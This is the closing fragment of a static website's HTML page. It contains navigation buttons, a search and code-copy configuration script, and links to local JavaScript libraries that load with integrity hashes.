fa-arrow-up fa-fw"></i>
</a><a href=# id=view-comments class=fixed-button title="View Comments"><i class="fas fa-comment fa-fw"></i></a></div><div class=assets><script type=text/javascript>window.config={code:{copyTitle:"Copy to clipboard",maxShownLines:10},comment:{},search:{distance:100,findAllMatches:!0,fuseIndexURL:"/index.json",highlightTag:"em",ignoreFieldNorm:!1,ignoreLocation:!0,isCaseSensitive:!1,location:0,maxResultLength:10,minMatchCharLength:2,noResultsFound:"No results found",snippetLength:300,threshold:.1,type:"fuse",useExtendedSearch:!1},table:{sort:!0}}</script><script type=text/javascript src=/lib/tablesort/tablesort.min.23640461c9e6941882f50f4208436e1932c806bcc32323a34ff378781204951e05534a0bbc3c1e401d111aa22a26ecc5d4f2cfb43af59d94da8a24f2b8ef8506.js integrity="sha512-I2QEYcnmlBiC9Q9CCENuGTLIBrzDIyOjT/N4eBIElR4FU0oLvDweQB0RGqIqJuzF1PLPtDr1nZTaiiTyuO+FBg=="></script><script type=text/javascript src=/lib/clipboard/clipboard.min.b08a94127467df50609e03e61edd897a7ce57830ec5f060efa2caf438e8cc3a44bfae7405198f69ffbbf3c663cd0dc51c729ceed1f71206c792c4cf0e0835625.js integrity="sha512-sIqUEnRn31BgngPmHt2JenzleDDsXwYO+iyvQ46Mw6RL+udAUZj2n/u/PGY80NxRxynO7R9xIGx5LEzw4INWJQ=="></script><script type=text/javascript src=/js/theme.min.js defer></script></div></body></html>